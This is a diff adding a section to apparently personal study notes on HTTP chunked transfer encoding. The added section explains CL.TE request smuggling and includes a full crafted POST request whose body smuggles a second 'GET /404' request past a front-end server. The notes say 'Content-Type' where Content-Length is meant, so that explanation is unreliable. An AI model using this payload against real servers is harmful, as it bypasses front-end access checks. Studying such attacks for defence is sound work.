@@ -23,3 +23,48 @@ is a test\r\n
 ```
 
  The final chunk has a size of 0, which indicates the end of the response. The client understands that the response is complete when it receives a chunk with a size of 0.
+
+
+CASE 1:
+
+Between Two nodes , First node refers to Front End Node and the Second Node refers to Back End Node 
+
+If the First Node uses Content Type and the Second Node doesn't but supports Transfer Encoding ... An attacker can abuse this behavior to smuggle an additional request the first Node wont account for , but the second node will accept and parse.
+
+```
+POST / HTTP/1.1
+Host: Host
+Sec-Ch-Ua: 
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: ""
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+Ola: Ola
+```
+
+in situation this request was used , the First Node will see a POST request with 
+
+```
+0
+
+GET /404 HTTP/1.1
+Ola: Ola
+```
+as body because it uses the Content-Type header to parse the request, this allows ``` GET /404 HTTP/1.1
+Ola: Ola``` to go unchallenged by the first node , but once it gets to the second node which uses *Transfer-Encoding* it sees two request instead one a post request that uses a chunk and ends without a body and a second request ```GET /404 HTTP/1.1
+Ola: Ola``` ... This way both request will be processed and if there are any checks in the first node , it has been bypassed
